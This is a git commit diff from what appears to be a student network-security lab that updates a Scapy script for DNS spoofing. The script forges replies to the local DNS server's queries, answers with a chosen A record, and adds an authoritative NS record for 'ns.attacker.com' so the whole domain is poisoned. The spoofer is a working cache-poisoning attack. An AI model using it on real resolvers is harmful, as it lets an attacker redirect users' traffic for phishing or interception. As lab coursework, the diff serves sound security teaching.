4cd2a29f54be32f07f40c6a60cf3791555207009
Tommaso Soncin <soncintommaso@gmail.com>
2025-05-01 16:36:40 +0200

    feat: task4 done

--- lab10/spoofer.py
+++ lab10/spoofer.py
@@ -14,21 +14,49 @@ class Spoofer:
         self.if_name = if_name
         self.filter = filter
 
-    def spoof_dns(self, pkt: PacketList):
-        if DNS in pkt and self.ns_name in pkt[DNS].qd.qname.decode("utf-8"):
+    def spoof_dns(self, pkt: PacketList) -> None:
+        if (
+            DNS in pkt
+            and IP in pkt
+            and pkt[IP].src == "10.9.0.53"
+            and self.ns_name in pkt[DNS].qd.qname.decode("utf-8")
+        ):
             print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
             # Creates an IP object, this is our spoofed answer.
+            # In this case we could have set dst to 10.9.0.53
+            # The attacker dns has this ip: 10.9.0.153
             ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
-            # Create a UDP object, spoofed answer UDP "part", since
-            # DNS works over UDP (also TCP but we don't care about it now).
+            # Create a UDP object, spoofed answer UDP, since
+            # DNS works over UDP (and TCP but we don't care about it now).
             udp = UDP(dport=pkt[UDP].sport, sport=53)
             # Create an answer record, DNS answer section.
             # rr = resource record
+            # rdata: the ip that example.com will resolve to.
             Anssec = DNSRR(
-                type="A", ttl=259200, rrname=pkt[DNS].qd.qname, rdata="1.1.1.1"
+                type="A", ttl=259200, rrname=pkt[DNS].qd.qname, rdata="10.9.0.1"
             )
+
+            NSsec = DNSRR(
+                rrname=pkt[DNS].qd.qname,
+                type="NS",
+                ttl=259200,
+                rdata=b"ns.attacker.com.",  # We're telling that attacker.com dns is authoritative for example.com
+            )
+
             # Create a DNS object
-            dns = DNS(id=pkt[DNS].id, an=Anssec)
+            dns = DNS(
+                id=pkt[DNS].id,  # Same ID as the request
+                qd=pkt[DNS].qd,  # Same request as the request
+                aa=1,  # Difference with the local attack
+                rd=0,
+                qr=1,
+                qdcount=1,
+                ancount=1,
+                nscount=1,  # Since we now have an Authoritative answer
+                arcount=0,
+                an=Anssec,
+                ns=NSsec,
+            )
             # Assemble the spoofed DNS packet
             spoofpkt = ip / udp / dns
             _ = send(spoofpkt)
